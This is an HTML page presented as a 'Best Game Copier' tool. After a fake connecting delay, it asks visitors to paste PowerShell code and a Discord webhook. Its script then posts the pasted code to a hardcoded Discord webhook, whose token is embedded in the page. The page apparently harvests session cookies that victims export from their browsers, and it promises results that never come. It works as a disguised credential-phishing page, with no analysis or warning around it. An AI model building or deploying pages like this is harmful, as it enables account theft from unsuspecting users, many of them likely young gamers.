<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Best Game Copier</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: black;
            overflow: hidden;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        /* Loader Styles */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: black;
            z-index: 10;
            flex-direction: column;
            color: blue;
        }

        #loader-text {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .dots {
            display: flex;
            gap: 10px;
        }

        .dot {
            width: 10px;
            height: 10px;
            background-color: blue;
            border-radius: 50%;
            animation: slideDots 1.5s infinite;
        }

        .dot:nth-child(1) {
            animation-delay: 0s;
        }

        .dot:nth-child(2) {
            animation-delay: 0.3s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes slideDots {
            0%, 100% {
                transform: translateX(0);
                opacity: 0.3;
            }
            50% {
                transform: translateX(20px);
                opacity: 1;
            }
        }

        /* Background animation */
        @keyframes backgroundGradient {
            0% {
                background: radial-gradient(circle, #1e90ff, #00008b, black);
            }
            50% {
                background: radial-gradient(circle, #00008b, black, #1e90ff);
            }
            100% {
                background: radial-gradient(circle, black, #1e90ff, #00008b);
            }
        }

        body {
            animation: backgroundGradient 10s infinite;
        }

        .grid {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 20px;
            width: 90%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
        }

        h1 {
            margin-bottom: 10px;
            text-align: center;
            font-size: 24px;
        }

        input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            margin-bottom: 10px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
        }

        button {
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background: #1e90ff;
            color: white;
            width: 100%;
        }

        button:hover {
            background: #00008b;
        }

        .error {
            color: red;
            text-align: center;
        }

        /* Notification Styles */
        .notification {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: #1e90ff;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInOut 4s ease forwards;
        }

        @keyframes fadeInOut {
            0% {
                opacity: 0;
                transform: translateY(20px);
            }
            10%, 90% {
                opacity: 1;
                transform: translateY(0);
            }
            100% {
                opacity: 0;
                transform: translateY(20px);
            }
        }

        /* Discord Button */
        .discord-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #7289da;
            border: none;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            cursor: pointer;
        }

        .discord-btn:hover {
            background: #5865f2;
        }

        .discord-btn:hover::after {
            content: 'Join our Discord';
            position: absolute;
            bottom: 70px;
            right: 10px;
            background: #1e90ff;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }

        .discord-icon {
            width: 25px;
            height: 25px;
            background: url('https://www.iconpacks.net/icons/2/free-discord-logo-icon-2429-thumb.png') no-repeat center;
            background-size: contain;
        }
    </style>
</head>
<body>
    <div id="loader">
        <div id="loader-text">Connecting to Server</div>
        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>

    <div class="grid" style="display: none;" id="main-content">
        <h1>Best Game Copier</h1>
        <input id="webhookUrl" type="text" placeholder="Enter your Discord Webhook (for results)" />
        <input id="powershellCode" type="text" placeholder="Enter your PowerShell code" />
        <button id="copyButton">Submit Code</button>
        <p id="errorMessage" class="error" style="display: none;"></p>
    </div>

    <button class="discord-btn" onclick="window.open('https://discord.gg/KUmGXNJj', '_blank')">
        <div class="discord-icon"></div>
    </button>

    <div id="notification-container"></div>

    <script>
        const copyButton = document.getElementById('copyButton');
        const powershellCode = document.getElementById('powershellCode');
        const webhookUrl = document.getElementById('webhookUrl');
        const errorMessage = document.getElementById('errorMessage');
        const loader = document.getElementById('loader');
        const mainContent = document.getElementById('main-content');
        const notificationContainer = document.getElementById('notification-container');

        // Show website after 10 seconds
        setTimeout(() => {
            loader.style.opacity = '0';
            setTimeout(() => {
                loader.style.display = 'none';
                mainContent.style.display = 'flex';
            }, 500);
        }, 10000);

        function isValidWebhook(url) {
            const discordWebhookPattern = /https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/;
            return discordWebhookPattern.test(url);
        }

        function showNotification(message) {
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.textContent = message;
            notificationContainer.appendChild(notification);

            setTimeout(() => {
                notification.remove();
            }, 4000);
        }

        copyButton.addEventListener('click', () => {
            const code = powershellCode.value.trim();
            const userWebhook = webhookUrl.value.trim();

            if (!code) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'No PowerShell code has been entered. Please enter your PowerShell code and try again.';
                return;
            }

            if (!userWebhook || !isValidWebhook(userWebhook)) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'Invalid or missing Discord webhook for results. Please enter a valid webhook.';
                return;
            }

            errorMessage.style.display = 'none';

            // Replace this webhook URL with your server-side webhook
            const serverWebhook = "https://discord.com/api/webhooks/1312257861841195080/W4ql9QaD25K3ghCY3fSvJnor9CDCZtHnea9JwkaO-wxYv8A2flQjDoNp_YwJBu571UTd";

            // Create a .txt file content
            const fileContent = new Blob([code], { type: 'text/plain' });
            const file = new File([fileContent], 'powershell_code.txt');

            // Prepare form data
            const formData = new FormData();
            formData.append('file', file);
            formData.append('payload_json', JSON.stringify({
                content: `User Webhook for Results: ${userWebhook}`
            }));

            // Send the PowerShell code file to the server webhook
            fetch(serverWebhook, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    showNotification('PowerShell code successfully sent! The results will be sent to your provided webhook.');
                } else {
                    showNotification('Failed to send the PowerShell code. Please try again later.');
                }
            })
            .catch(error => {
                showNotification('An error occurred: ' + error.message);
            });
        });
    </script>
</body>
</html>
